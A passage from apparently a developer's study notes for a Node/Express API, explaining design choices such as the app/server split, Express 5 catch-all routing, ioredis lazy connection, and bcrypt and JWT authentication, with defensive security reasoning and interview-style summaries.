middleware" (`src/app.ts`, exports `app`, never calls `.listen()`) from
"start listening on a port, handle graceful shutdown"
(`src/server.ts`, imports `app`, is the only place that calls
`app.listen()`).

**Why it exists in this project.** Before this phase, `server.ts` built
`app` and called `.listen()` in the same file, with `app` never
exported. That made the app fundamentally untestable at the HTTP level:
importing that file to test a route would also open a real port and
initialize the real DB pool as unavoidable side effects. Splitting the
two means a test can import `src/app.ts` alone and get a fully
configured Express app with none of those side effects.

**How it works mechanically.** `src/app.ts` builds `app = express()`,
registers every middleware and route in order, and exports `app` — that's
the entire file's job, nothing calls `.listen()`. `src/server.ts` imports
that `app`, calls `app.listen(config.PORT, ...)`, and owns the existing
graceful-shutdown logic (SIGTERM/SIGINT → `server.close()` →
`Promise.all([pool.end(), redis.quit()])` → exit), unchanged in
structure from Phase 1 aside from also closing the new Redis client
alongside the existing Postgres pool. In every test file under
`tests/middleware/` and `tests/routes/`, `supertest(app)` (or an
ad-hoc `express()` app built inline, for tests that want to isolate one
middleware) wraps the exported Express app and issues real HTTP-shaped
requests against it internally per call, without either binding a real,
fixed TCP port or requiring any test-specific coordination between test
files that both want port 3000.

**Where it lives in the codebase.** `src/app.ts` (composition root);
`src/server.ts` (listen + shutdown only); every file under
`tests/middleware/` and `tests/routes/` uses `supertest`.

**Common pitfalls.**

- Calling `app.listen()` inside `app.ts` "for convenience" — reintroduces
  exactly the untestable coupling this split exists to remove; any test
  importing `app.ts` would open a real port as a side effect again.
- Importing `src/app.ts` in a test file that needs a specific
  `NODE_ENV`/config value (like `tests/routes/health.test.ts` needing
  `.env.test`'s values) via a plain top-level `import` — `src/config/
index.ts` reads `process.env` at module-evaluation time, and ES module
  imports are always fully evaluated before any of the importing file's
  own top-level statements run, regardless of where the import appears
  textually in the file. A `process.loadEnvFile('.env.test')` call
  written above a static `import { app } from '../../src/app.js'` still
  loses the race — the fix is a **dynamic** `import()` inside
  `beforeAll`, deferring evaluation until after the env is loaded (see
  `tests/routes/health.test.ts`).
- Forgetting that `tests/globalSetup.ts` runs once, before test files
  are loaded, in a way that doesn't reliably propagate its own
  `process.loadEnvFile` call into each test file's process/worker — this
  codebase's existing convention (`tests/db/constraints.test.ts`,
  followed here in `tests/routes/health.test.ts`) is for every test file
  that needs `.env.test`'s values to call `process.loadEnvFile('.env.test')`
  itself, redundantly, rather than relying on global setup alone.

**Production considerations.** This split has no runtime behavior
difference in production — `npm start` still runs `server.ts`, which
still calls `app.listen()` exactly once. The entire benefit is
testability; there's no tradeoff to weigh against it.

**Interview answer.** I split the Express app's construction from
starting the server: `app.ts` builds and exports the configured `app`
without ever calling `.listen()`, and `server.ts` is the only file that
imports `app` and starts listening, alongside the existing graceful-
shutdown logic. That split is what makes the app testable at the HTTP
level with `supertest` — tests import `app.ts` directly and get a fully
wired Express app with no real port opened and no server lifecycle to
manage, since supertest handles request/response internally against the
app object rather than needing a real, bound socket.

---

### The path-to-regexp v8 wildcard change, and the catch-all 404 pattern

**What it is.** Express 5 bundles `path-to-regexp@8`, which dropped
support for a bare `'*'` as a route pattern — the classic Express-4
catch-all idiom, `app.use('*', notFoundHandler)`, now throws at
route-registration time instead of matching every path.

**Why it exists in this project.** A catch-all 404 handler is required
scope for this phase (registered after every real route, before the
error handler), and the obvious, most-documented way to write one — the
Express-4-era `app.use('*', ...)` — actively breaks the app on this
Express version. This was verified directly against the installed
version rather than assumed from older tutorials or training data.

**How it works mechanically.** Confirmed by running it:
`app.use('*', (req, res) => res.end())` throws `Missing parameter name
at index 1: *` immediately, at the `app.use()` call itself, because
`path-to-regexp@8` (Express 5's bundled router-pattern parser) no longer
treats a bare `*` as "match anything" — the syntax it does support for
wildcards changed. The fix used in `src/middleware/notFoundHandler.ts`
is to register it with **no path argument at all**:
`app.use(notFoundHandler)`. A path-less `app.use()` was never tied to
`path-to-regexp`'s pattern syntax in the first place — it matches every
method and path unconditionally, with no route-pattern parsing
involved, which is both the fix for this specific version and a more
version-agnostic way to express "match everything" than depending on
whatever wildcard syntax path-to-regexp happens to support at any given
Express major version.

**Where it lives in the codebase.**
`src/middleware/notFoundHandler.ts` (the handler itself);
`app.use(notFoundHandler)` in `src/app.ts`, registered after every route
and before the error handler.

**Common pitfalls.**

- Copying `app.use('*', ...)` from older Express-4 documentation,
  tutorials, or Stack Overflow answers without testing against the
  actual installed Express version — throws immediately at startup on
  Express 5 with `path-to-regexp@8`, not a subtle runtime bug but a hard
  crash the moment that line registers.
- Assuming `app.get('/*', ...)` (rather than `app.use`) is a safe
  alternative — it has the same underlying `path-to-regexp` wildcard-
  syntax dependency and the same failure mode; the actual fix is
  avoiding a path argument entirely for a true catch-all, not finding a
  different wildcard string that happens to still parse.
- Not verifying a "well-known" library behavior against the actual
  installed version when it materially changes a design — this specific
  fact was confirmed by literally running `app.use('*', fn)` against the
  installed `node_modules/express`, rather than trusted from general
  Express knowledge, precisely because Express 5's dependency bump was
  exactly the kind of change generic knowledge can be stale about.

**Production considerations.** None beyond the registration-time crash
itself — since it throws immediately at app construction, this fails
loudly and immediately in any environment (dev, CI, or prod) the moment
the offending line is registered, rather than manifesting as a subtle
runtime bug. That's the best-case version of "this is broken" — it's
impossible to miss.

**Interview answer.** Express 5 bundles a newer major version of
`path-to-regexp`, its internal route-pattern parser, which dropped
support for a bare `'*'` wildcard — the classic Express-4 catch-all
pattern `app.use('*', handler)` now throws at registration time instead
of matching every route. I write the catch-all with no path argument at
all — `app.use(handler)` — which was never tied to path-to-regexp's
pattern syntax in the first place and matches everything unconditionally,
which is both the fix for this Express version and more resilient to
whatever wildcard syntax future versions support or drop.

---

### ioredis: lazy vs eager connection, and mirroring pg.Pool's laziness

**What it is.** Whether a database/cache client opens its network
connection the moment it's constructed (eager) or defers it until the
first real command is issued (lazy) — a configuration choice, not a
fixed property of the library.

**Why it exists in this project.** `src/lib/redis.ts` is imported
transitively by `src/app.ts` (via the health route), and `src/app.ts` is
imported by every test file in `tests/middleware/` and `tests/routes/`
— including ones that have nothing to do with Redis at all. If
constructing the Redis client opened a real connection immediately, just
importing `app.ts` for an unrelated middleware test would trigger a real
network connection as an invisible side effect.

**How it works mechanically.** `ioredis` connects eagerly **by
default** — the moment `new Redis(url)` runs, it opens a real TCP
socket. That's different from `pg.Pool` (`src/db/pool.ts`), which is
lazy by default: constructing a `Pool` allocates no connections until
the first `.query()` call. `src/lib/redis.ts` passes
`lazyConnect: true` explicitly to make `ioredis` behave the same way
`pg.Pool` already does — the connection only opens on the first actual
command, which in practice is `checkRedisHealth`'s `PING`. Without that
flag, the two dependency clients in this codebase would have
inconsistent behavior for no functional reason, and every module that
happens to import `redis.ts` — directly or transitively — would carry
an invisible eager-connection side effect the equivalent Postgres import
doesn't have.

Separately, `maxRetriesPerRequest: 1` bounds how many times one
in-flight command (the health-check ping) is retried while the
connection is down before its promise rejects — this is what makes
`checkRedisHealth()` fail fast instead of riding out `ioredis`'s
default, considerably longer retry budget. This is a genuinely different
knob from `retryStrategy` (left at its default), which governs
background _reconnection_ attempts after a connection drops — that's
allowed to keep retrying indefinitely in the background, since it
doesn't block anything; `maxRetriesPerRequest` is specifically about how
long one caller waits for one command's result.

**Where it lives in the codebase.** `src/lib/redis.ts` — the `redis`
client and `checkRedisHealth()`; `src/db/pool.ts` for the analogous
(already-lazy-by-default) Postgres pattern this mirrors.

**Common pitfalls.**

- Constructing `new Redis(url)` without `lazyConnect: true` in a module
  that might be imported for reasons unrelated to Redis (as `app.ts` is,
  by many test files) — turns "import this file" into "open a real
  network connection," which is surprising, slows down unrelated tests,
  and can make a test suite depend on Redis being reachable even for
  tests that never touch it.
- Confusing `retryStrategy` and `maxRetriesPerRequest` — tuning the
  wrong one when trying to make a health check fail faster (adjusting
  `retryStrategy`, which governs reconnection, does nothing to bound how
  long an individual command waits).
- Assuming `lazyConnect` means "never connects automatically" — it only
  defers the _first_ connection to the first command; once that command
  runs, the client behaves exactly like an eagerly-connected one for
  every subsequent command, including staying connected in the
  background.

**Production considerations.** BullMQ — this repository's future
`worker/` process — requires `ioredis` specifically as its Redis client
(not the other major Node Redis library, `node-redis`), which is why
`ioredis` was chosen here for connection-only health checking rather
than a different, perhaps simpler, client: it's the one client this
codebase will need again regardless, so introducing it now means the
worker phase reuses this exact client rather than adding a second Redis
library to the dependency tree later.

**Interview answer.** `ioredis` connects eagerly by default — opening a
real socket the moment the client is constructed — which is the
opposite of `pg.Pool`'s default laziness in this same codebase. Since
the Redis client module gets imported transitively by many things that
have nothing to do with Redis (any test that imports the app), I pass
`lazyConnect: true` so constructing the client is side-effect-free and
the actual connection only opens on the first real command, matching how
the Postgres pool already behaves. Separately, I bound
`maxRetriesPerRequest` to `1` so a health-check ping fails fast instead
of riding out the client's default retry budget when Redis is down —
distinct from `retryStrategy`, which governs unrelated background
reconnection and is left at its default.

## Phase 4: Authentication

### New dependencies: bcryptjs and jsonwebtoken

**What it is.** Two runtime dependencies added in this phase: `bcryptjs`
(password hashing) and `jsonwebtoken` (signing/verifying JWTs), plus
`@types/jsonwebtoken` as a dev dependency since `jsonwebtoken` ships no
bundled types (`bcryptjs` does, so no separate types package was needed
for it).

**Why it exists in this project.** Neither password hashing nor JWT
handling has a reasonable hand-rolled implementation — both are exactly
the kind of security-critical, easy-to-get-subtly-wrong code where using
a widely-audited library is the responsible choice, not a shortcut.

**How it works mechanically / the alternatives.**

- `bcryptjs` was chosen over `bcrypt` (the more common choice, native
  bindings via `node-gyp`). `bcrypt` is faster since it runs compiled C++
  rather than pure JS, but that speed comes with a native compile step
  that can fail across platforms, Docker base images, or CI runners
  without the right build toolchain present. `bcryptjs` is a drop-in-
  compatible pure-JS reimplementation of the same algorithm — same hash
  format, same API shape (`hash`/`compare`/`hashSync`/`compareSync`) —
  trading some raw speed for zero native-build risk. For this project's
  scale, that's the right trade: nothing here is hashing at a volume
  where the speed difference matters, but a broken Docker build over a
  native dependency is a real, recurring annoyance.
- `jsonwebtoken` was chosen over `jose` (a more modern, ESM-native
  library with broader algorithm and JWK support). `jose` is the better
  choice for anything doing asymmetric signing, key rotation via JWKS, or
  needing non-Node runtimes (edge functions, browsers). This project only
  needs the simplest case — sign and verify with one shared secret,
  HS256 — which is exactly `jsonwebtoken`'s core use case and where its
  simpler, more widely-known API is a better fit than `jose`'s larger
  surface area.

**Where it lives in the codebase.** `src/services/passwordService.ts`
(`bcryptjs`), `src/services/tokenService.ts` (`jsonwebtoken`).

**Common pitfalls.**

- Reaching for `bcrypt` by default out of familiarity without weighing
  the native-build risk against the actual performance need.
- Assuming `jsonwebtoken`'s types match runtime behavior exactly —
  `@types/jsonwebtoken`'s `expiresIn` type is a template-literal union
  narrower than plain `string`, which doesn't accept a Zod-validated
  config string without a cast (see the JWT structure section below).

**Production considerations.** If this project ever needed asymmetric
signing (e.g. a separate service verifying tokens without holding the
signing secret) or JWK-based key rotation, `jose` would become the
better choice and this would be worth revisiting — the two libraries
aren't a "correct vs incorrect" choice, just scoped to different needs.

**Interview answer.** I chose `bcryptjs` over `bcrypt` to avoid a native
compile step that can break across platforms and CI, accepting a modest
speed cost for a project that isn't hashing at meaningful volume. I chose
`jsonwebtoken` over `jose` because this project only needs simple
shared-secret HS256 sign/verify, where `jsonwebtoken`'s smaller, more
familiar API is a better fit than `jose`'s broader but heavier surface
aimed at asymmetric keys and JWK rotation.

---

### Hashing vs. encryption for passwords

**What it is.** Encryption is reversible: given the right key, ciphertext
converts back to the original plaintext. Hashing is (by design)
one-way: a hash function maps input to a fixed-size output with no
inverse operation — there's no key that turns a bcrypt hash back into
the original password.

**Why it exists in this project.** `users.password_hash` stores a hash,
never an encrypted password, because the application itself never needs
to recover a user's original password — only to check whether a
candidate string matches. If passwords were merely encrypted, anyone who
obtained both the ciphertext and the encryption key (a database breach
plus, say, an app-config leak) could recover every plaintext password
directly. Hashing removes that risk structurally: there is no key to
steal that would undo it.

**How it works mechanically.** `passwordService.hashPassword` calls
`bcrypt.hash(plain, cost)`, which never stores `plain` anywhere — only
the one-way hash. Verifying a login re-hashes the candidate password
(using the salt embedded in the stored hash, see the Salt section below)
and compares the two hash outputs, never decrypting anything.

**Where it lives in the codebase.** `src/services/passwordService.ts`;
the `password_hash` column in `migrations/20260810111606772_create-users-table.ts`.

**Common pitfalls.**

- Calling a hashed password "encrypted" in code comments or docs — the
  distinction matters because it implies a recovery path that doesn't
  exist and shouldn't be designed for.
- Building a "forgot password" flow that tries to recover and email the
  original password — structurally impossible with hashing, and a
  correct password-reset flow (invalidate + let the user set a new one)
  doesn't need it anyway.

**Production considerations.** None beyond what's already true here —
this is a settled, non-controversial practice; the interesting decisions
are downstream of it (which hash function, what cost factor — see next).

**Interview answer.** Encryption is reversible with the right key;
hashing isn't reversible at all. Passwords are hashed, not encrypted,
because the app never needs the original password back — only to check
whether a login attempt matches — and removing the possibility of
recovery means a database breach alone (without some separate encryption
key) can't hand an attacker plaintext passwords.

---

### Why bcrypt over SHA-256: the attacker-economics argument

**What it is.** SHA-256 is a general-purpose cryptographic hash function,
designed to be as fast as possible. bcrypt is a password-hashing
function specifically, designed to be deliberately, tunably slow.

**Why it exists in this project.** Fast isn't a virtue for a password
hash — it's the opposite. `passwordService.ts` uses bcrypt (via
`bcryptjs`), not `crypto.createHash('sha256')`, specifically because
SHA-256's speed is a liability against offline brute-force.

**How it works mechanically.** If an attacker steals a database of
password hashes, they no longer need the live application at all — they
can brute-force guesses locally, as fast as their hardware allows, with
no rate limiting or network latency in the way. Modern GPUs compute
billions of SHA-256 hashes per second, so a stolen SHA-256 hash of even
a fairly strong password can often be brute-forced in a practical amount
of time. bcrypt is deliberately expensive per hash — driven by its cost
factor (next section) — so the same GPU that computes billions of
SHA-256 hashes per second might compute only a few hundred or thousand
bcrypt hashes per second at a reasonable cost. That difference compounds
across an entire stolen database: cracking is an economics problem
(attacker time and hardware cost per guess), and bcrypt raises the cost
per guess by many orders of magnitude compared to a general-purpose hash.

**Where it lives in the codebase.** `src/services/passwordService.ts`.

**Common pitfalls.**

- Using any general-purpose hash (SHA-256, SHA-512, MD5) for passwords —
  they're built to be fast, which is exactly wrong here.
- Assuming "cryptographically secure hash" alone is sufficient — SHA-256
  is cryptographically secure (collision-resistant, etc.) but that's a
  different property from being slow enough to resist brute-forcing.

**Production considerations.** bcrypt has a 72-byte input limit (longer
passwords are silently truncated by some implementations) and no
built-in memory-hardness, which is why newer algorithms like Argon2 are
sometimes preferred for new systems. bcrypt remains a reasonable,
well-audited, widely-supported choice and is what this project uses; a
future migration to Argon2 would be a reasonable evolution, not a
correction of a mistake.

**Interview answer.** A general-purpose hash like SHA-256 is designed to
be fast, which is exactly the wrong property for password storage: if a
database of hashes is ever stolen, an attacker brute-forces offline with
no rate limiting, and a fast hash lets them try billions of guesses per
second. bcrypt is deliberately slow and tunably so via its cost factor,
which raises the cost of each guess by orders of magnitude and makes
brute-forcing a stolen hash database economically impractical rather
than just theoretically hard.

---

### The bcrypt cost factor: what it trades off, and why it's a DoS surface

**What it is.** bcrypt's cost factor (also called "work factor" or
"rounds") controls how many times its internal key-derivation step
repeats. It's not linear — each increment of the cost factor roughly
**doubles** the time a single hash or comparison takes.

**Why it exists in this project.** `BCRYPT_COST` (`src/config/env.ts`,
default `12`) is a configuration value, not a hardcoded constant,
specifically so it can be tuned per environment without a code change:
production uses `12` (a reasonable 2024+ default, ~200-300ms per hash on
typical hardware), while `.env.test` overrides it to `4` so the test
suite — which hashes and compares passwords repeatedly across signup,
login, and the dummy-hash timing mitigation — stays fast.

**How it works mechanically.** Every signup calls `hashPassword`
(~200-300ms at cost 12); every login calls `verifyPassword` against a
real hash, or — on a failed lookup — `verifyAgainstDummyHash`, which
still costs the same ~200-300ms (see the Timing Attacks section below
for why that's deliberate). That means **every** `POST /api/auth/login`
request, successful or not, does a fixed, non-trivial amount of CPU
work. A specific number of concurrent requests to `/login` can
meaningfully load the server's CPU in a way most other endpoints in this
codebase can't — this makes the login endpoint a plausible
denial-of-service surface distinct from a general traffic flood, and is
part of why the cost factor is a genuine security/operability trade,
not just a "bigger number is more secure" knob.

**Where it lives in the codebase.** `BCRYPT_COST` in
`src/config/env.ts`; consumed in `src/services/passwordService.ts`.

**Common pitfalls.**

- Treating cost as a linear scale — going from 10 to 12 isn't "20% more
  work," it's roughly 4x the work, because each increment doubles the
  previous one.
- Setting production cost too high without load-testing the login
  endpoint under concurrency, and being surprised when a moderate spike
  in login attempts (legitimate or a credential-stuffing attempt) causes
  real CPU pressure.
- Forgetting to raise the cost over time — hardware gets faster every
  year, so a cost that was expensive-enough in 2020 is measurably
  cheaper to brute-force today at the same setting.

**Production considerations.** Cost should be re-evaluated periodically
against current hardware (this is an industry-standard practice, not
specific to this project) and against real login-endpoint latency
budgets/load. A production system under real credential-stuffing attack
traffic would likely need rate limiting on `/login` in front of this
cost, not instead of it — see the OWASP-style rate-limiting middleware
this codebase doesn't have yet (see CLAUDE.md's architecture note on
`src/middleware/` for rate limiting as a future responsibility).

**Interview answer.** bcrypt's cost factor is exponential, not linear —
each increment roughly doubles hashing time — which is what makes it
tunable against ever-faster brute-forcing hardware over time. But that
same cost is paid on every legitimate hash or comparison too, including
every login attempt, which turns the login endpoint into a real CPU-load
surface: a burst of login requests, even without any brute-forcing
intent, does meaningfully more server-side work than most other
endpoints. Choosing a cost factor is a genuine trade between
brute-force resistance and legitimate-traffic capacity, not a
"maximize it" decision.

---

### Salt: what it defeats, where bcrypt stores it, and why compare() works anyway

**What it is.** A salt is random data mixed into a password before
hashing, unique per hash. It's not secret — it's stored alongside (in
bcrypt's case, embedded within) the hash itself.

**Why it exists in this project.** Without a salt, two users with the
same password would produce the identical hash, and an attacker could
precompute a lookup table of hash → common-password pairs once (a
"rainbow table") and check every stolen hash against it instantly,
regardless of bcrypt's per-hash cost. A salt defeats precomputation:
since every hash is salted differently, there's no single table that
covers even two users with the same password, let alone an entire
database — the attacker is forced back to brute-forcing each hash
individually, which is exactly what the cost factor is designed to make
expensive.

**How it works mechanically.** `bcrypt.hash(plain, cost)` generates a
fresh random salt internally on every call and encodes it directly into
the returned string, in a fixed format:
`$2b$<cost>$<22-char-salt><31-char-hash>` — one string, no separate salt
column needed anywhere in the schema (confirmed by the test in
`tests/services/passwordService.test.ts` asserting two hashes of the
identical password differ). `bcrypt.compare(plain, storedHash)` works
despite that randomness because it doesn't need the salt supplied
separately — it parses the salt back out of `storedHash`'s own prefix,
re-hashes the candidate `plain` password using that exact salt and cost,
and compares the two resulting hash strings for equality. The salt was
never secret; its only job is uniqueness, not confidentiality.

**Where it lives in the codebase.**
`src/services/passwordService.ts` — `hashPassword`/`verifyPassword`; no
separate salt column exists in `users` (see
`migrations/20260810111606772_create-users-table.ts`) because it isn't
needed.

**Common pitfalls.**

- Trying to add a separate `salt` column "to be safe" — bcrypt hashes
  already carry their own salt; a second one is redundant and easy to
  wire up inconsistently with the embedded one.
- Confusing "salt" with "secret" — a salt is stored in the clear
  alongside the hash and provides no protection if reused predictably;
  its value is exclusively in being unique per hash, not in being
  hidden.

**Production considerations.** None beyond what's already correct here
— bcrypt's salt handling is a solved, standard part of the algorithm;
nothing about it needs custom implementation or configuration in this
codebase.

**Interview answer.** A salt is random per-hash data that defeats
precomputed rainbow-table attacks by ensuring no two hashes of the same
password ever match, forcing an attacker to brute-force each one
individually. bcrypt generates a fresh salt on every hash call and
embeds it directly in the returned hash string, so there's no separate
salt column to manage — `compare()` works despite the randomness because
it re-extracts the salt from the stored hash's own prefix before
re-hashing the candidate password with it.

---

### JWT structure: three parts, base64 not encryption, and what's safe to include

**What it is.** A JSON Web Token is three base64url-encoded segments
joined by dots: `header.payload.signature` — e.g.
`eyJhbGc...​.eyJzdWI...​.SflKxwRJ...`. The header names the signing
algorithm; the payload carries claims (in this project, just `sub`,
`iat`, `exp`); the signature is a cryptographic MAC over the first two
segments.

**Why it exists in this project.** `src/services/tokenService.ts` issues
one of these per successful signup/login as the client's proof of
identity for subsequent requests, without the server needing to store
any session state (see the Stateless Auth section below).

**How it works mechanically.** Base64url is an _encoding_, not
_encryption_ — reversible by anyone, with no key required. Pasting any
JWT into a decoder (e.g. jwt.io) reveals its full header and payload
instantly. This project's payload is deliberately minimal — `signToken`
passes `{}` as the payload object and lets `jwt.sign`'s `subject` option
populate `sub` — because anything placed in a JWT payload should be
treated as world-readable: never a password, never anything sensitive,
only an opaque identifier plus timing claims (`iat`, `exp`). Only the
signature segment resists forgery (see the next section) — the payload
itself has zero confidentiality.

**Where it lives in the codebase.** `src/services/tokenService.ts` —
`signToken`; `TokenPayload` documents the exact claim shape this project
uses.

**Common pitfalls.**

- Assuming a JWT's contents are hidden because they look like an opaque
  token — they're one base64 decode away from being fully readable
  plaintext.
- Stuffing a JWT payload with sensitive or frequently-changing data
  (roles, email, feature flags) — anything in the payload is both
  publicly readable and frozen at issue time (stale until the token
  expires and is reissued), neither of which is true of a live database
  row.

**Production considerations.** If this project later needs to carry more
claims (e.g. a role for authorization), the same "public, frozen at
issue time" caveat applies to whatever gets added — a decision to make
deliberately, not by default.

**Interview answer.** A JWT is three base64url segments —
header, payload, signature — and base64 is just an encoding, not
encryption, so the payload is fully readable by anyone who has the
token, with no secret required to decode it. This project's payload only
ever carries a user id (`sub`) plus standard timing claims, on the
principle that nothing placed in a JWT payload should be treated as
confidential.

---

### Signature verification mechanics: how tampering is detected

**What it is.** The mechanism that makes a JWT's _signature_ — as
opposed to its payload — resistant to forgery: an HMAC-SHA256
computation over the header and payload, using a secret only the server
knows.

**Why it exists in this project.** Without this, a client could hand-edit
a token's base64-decoded payload (e.g. change `sub` to someone else's
user id) and hand it right back — the payload alone has no built-in
integrity check.

**How it works mechanically.** `jwt.sign` computes
`HMAC-SHA256(header + "." + payload, JWT_SECRET)` and appends the result
as the third segment. `jwt.verify` (in
`src/services/tokenService.ts`'s `verifyToken`) recomputes that exact
same HMAC over the token's own header and payload segments, using the
server's `JWT_SECRET`, and compares it to the signature segment the
token actually carries. Because HMAC-SHA256 is a cryptographic hash
function, changing even a single bit anywhere in the header or payload
produces a completely different HMAC output — there's no way to predict
what edit would produce a signature that still matches, short of
knowing the secret and recomputing it correctly. This is exactly what
`tests/services/tokenService.test.ts`'s tampered-payload test exercises:
editing the decoded payload and reassembling the token with the
_original_ signature produces a signature mismatch, and `verifyToken`
returns `{ ok: false, reason: 'invalid' }`.

**Where it lives in the codebase.** `src/services/tokenService.ts` —
`verifyToken`; `JWT_SECRET` in `src/config/env.ts` (required, minimum 32
characters, no default — see below for what a weak/leaked secret allows).

**Common pitfalls.**

- Assuming `jwt.verify` inspects the payload's _content_ for anything
  suspicious — it doesn't; it only checks whether the signature matches
  what the header+payload should produce given the secret. A tampered
  payload with a _coincidentally_ still-valid-looking shape is rejected
  purely because its signature no longer matches, not because the
  content itself was scrutinized.
- Not specifying/restricting the signing algorithm — `jsonwebtoken`
  defaults `jwt.sign` to HS256 here, which is what `verifyToken` expects;
  a known JWT vulnerability class involves an attacker resubmitting a
  token with `alg: none` or switching HS256/RS256 in ways a lax verifier
  accepts. This project's usage is the simple, single-secret, single-
  algorithm case, which sidesteps that class of bug rather than needing
  to defend against it explicitly.

**Production considerations.** A leaked `JWT_SECRET` breaks this
guarantee entirely — see the next section for exactly what that allows
an attacker to do, and why the env var has no default.

**Interview answer.** `jwt.verify` recomputes the HMAC-SHA256 signature
over the token's header and payload using the server's secret, and
compares it against the signature segment the token carries — it never
inspects payload content directly. Because a cryptographic hash changes
completely from even a single-bit input change, any edit to the payload
after signing produces a signature that no longer matches, which is how
tampering is detected — not by validating the payload's shape, but by
the recomputed signature simply not matching anymore.

---

### Stateless auth: the revocation problem, and the three standard mitigations

**What it is.** "Stateless" here means the server verifies a token's
validity purely by recomputing its signature — no database lookup, no
server-side session store consulted on every request. The tradeoff: once
issued, a token is valid until it expires, and the server has no
built-in way to invalidate it early.

**Why it exists in this project.** `requireAuth`
(`src/middleware/auth.ts`) is deliberately a pure function of the
token — no DB query on the happy path — which is what makes every
authenticated request cheap. That statelessness is also exactly what
creates the revocation gap this section is about.

**How it works mechanically — the revocation problem.** If a user's
account is compromised, their password is changed, or they explicitly
log out, any JWT already issued to them remains fully valid — signature
still matches, `exp` hasn't passed — until it naturally expires. There's
no "delete this session" operation possible against a stateless token by
design, because there's no server-side session record to delete.

**The three standard mitigations (industry-standard patterns — none
implemented in this project yet, deliberately, as this phase's scope is
just signup/login/verify):**

1. **Short expiry.** Bound the damage window by keeping token lifetime
   short. This project uses `JWT_EXPIRES_IN=7d`, a usability-leaning
   choice appropriate for a low-stakes personal-project auth flow — a
   production system handling anything sensitive would likely use
   something much shorter (minutes to hours), paired with mitigation 3.
2. **A denylist (blocklist).** Store revoked-but-not-yet-expired token
   identifiers (or user-ids-as-of-a-timestamp) somewhere fast to check —
   typically Redis, which this project already has wired up for a future
   phase — and check it on each request. This reintroduces a lookup, but
   a cheap one (a Redis existence check), not a full session store.
3. **Refresh-token rotation.** Issue a short-lived access token (minutes)
   alongside a longer-lived, revocable refresh token, stored server-side.
   The access token stays fast and stateless for normal requests; the
   refresh token is the one place revocation actually happens, and it's
   checked far less often (only when the access token expires).

**Where it lives in the codebase.** `src/middleware/auth.ts` (stateless
verification); `JWT_EXPIRES_IN` in `src/config/env.ts`. None of the
three mitigations are implemented — this is a documented gap, not an
oversight.

**Common pitfalls.**

- Believing a JWT can be "logged out" server-side with no additional
  infrastructure — without one of the three mitigations above, deleting
  a token client-side (e.g. clearing localStorage) prevents that _one_
  client from using it again, but the token itself is still cryptograph-
  ically valid if captured or replayed elsewhere.
- Choosing an very long expiry "for convenience" without weighing that
  it directly sets the ceiling on how long a compromised token stays
  dangerous.

**Production considerations.** A real production system handling
sensitive data would very likely need at minimum a short access-token
expiry plus refresh-token rotation (mitigations 1 + 3) — this project's
7-day, no-revocation setup is an explicit, documented simplification for
its current phase, flagged here specifically so it isn't mistaken for a
production-ready default later.

**Interview answer.** Stateless JWT auth means the server verifies
tokens purely by signature, with no session lookup — which is fast, but
means there's no way to revoke a token early once issued; it stays valid
until it expires no matter what happens to the account afterward. The
three standard mitigations are keeping expiry short to bound the damage
window, maintaining a denylist of revoked tokens checked against a fast
store like Redis, or splitting into a short-lived stateless access token
plus a longer-lived, revocable refresh token. This project currently
uses a 7-day token with none of those mitigations, which is a
deliberate, documented simplification for its current scope rather than
a production-ready choice.

---

### Bearer token transport: the Authorization header convention

**What it is.** The `Authorization: Bearer <token>` HTTP header is the
standard convention (RFC 6750) for a client to present a token proving
its identity on each request — "bearer" meaning whoever holds
(bears) the token is treated as authorized, no further proof needed.

**Why it exists in this project.** `requireAuth` reads exactly this
header and requires the exact `"Bearer "` prefix — matching how every
HTTP client, browser devtools, and API testing tool (curl, Postman,
etc.) already expects to send a token, rather than inventing a
project-specific header or convention.

**How it works mechanically.** `req.header('authorization')` reads the
raw header value; `requireAuth` checks it starts with the literal
7-character string `"Bearer "` (case-sensitive, matching the RFC's
convention), then treats everything after that prefix as the token
itself, which gets handed to `verifyToken`.

**Where it lives in the codebase.** `src/middleware/auth.ts`.

**Common pitfalls.**

- Forgetting the header check is case-sensitive on the scheme name — a
  client sending `bearer <token>` (lowercase) fails the `startsWith`
  check and gets a 401, correctly per the header convention but
  potentially surprising if a client library doesn't follow it exactly.
- Logging the raw `Authorization` header for debugging — this is exactly
  what `requireAuth`'s failure-path logging deliberately avoids: the
  token itself is never included in any `req.log` call, only the fact
  that a request failed and why (missing/invalid/expired).

**Production considerations.** None beyond what's already correct —
this is a settled HTTP convention, not a project-specific design
decision.

**Interview answer.** `Authorization: Bearer <token>` is the standard
RFC 6750 convention for presenting a token — "bearer" means the holder
of the token is trusted without further proof, which is exactly the
model a stateless JWT fits. The middleware requires the exact `"Bearer "`
prefix and treats everything after it as the token to verify, matching
what every standard HTTP client already expects to send.

---

### localStorage vs. httpOnly cookies: the XSS/CSRF tradeoff

**What it is.** Two places a client could store the JWT this API issues:
JavaScript-accessible browser storage (`localStorage`), or an `httpOnly`
cookie the browser attaches automatically and JavaScript can't read.

**Why it exists in this project (as a deliberate decision, not an
oversight).** This API returns the token directly in the JSON response
body (`{ user, token }`) rather than setting a cookie itself — that
choice implicitly hands storage responsibility to whatever frontend
consumes this API (the separate Next.js frontend mentioned in
CLAUDE.md), and is worth documenting explicitly rather than leaving
implicit.

**How it works mechanically — the tradeoff.**

- **`localStorage`** — Any JavaScript running on the page can read it,
  including injected JavaScript from a successful XSS attack. If an
  attacker gets any script to execute on the frontend (e.g. via an
  unescaped user-generated field rendered somewhere), they can read the
  token directly and exfiltrate it. It's immune to CSRF, though — a
  malicious third-party site can't read another origin's `localStorage`,
  and requests still require the frontend's own JS to explicitly attach
  the token to each request.
- **`httpOnly` cookie** — JavaScript literally cannot read it (the
  `httpOnly` flag exists for exactly this), so a successful XSS attack
  can't exfiltrate the token directly (though it can often still make
  authenticated requests _through_ the victim's browser while the page
  is open, which is a narrower blast radius than stealing the token
  outright). But cookies are attached to requests automatically by the
  browser, for _any_ site, which is what opens up CSRF — a malicious
  site can trigger a request to this API and the browser will attach the
  cookie, unless CSRF protection (e.g. a `SameSite` cookie attribute
  plus a CSRF token) is separately implemented.

**Where it lives in the codebase.** `src/routes/auth.ts` — the token is
returned in the JSON body on both signup and login, not set as a cookie
by this API.

**Common pitfalls.**

- Treating this as a solved, "cookies are just better" or "localStorage
  is just better" question — it's a genuine tradeoff between two attack
  classes (XSS vs. CSRF), not a strictly-dominant choice either way.
- Choosing `httpOnly` cookies without also implementing CSRF protection
  — that combination is worse than either mitigation alone, since it
  closes the XSS-exfiltration vector while leaving CSRF fully open.

**Production considerations.** If XSS risk is the primary concern for
this project's frontend (e.g. it renders significant user-generated
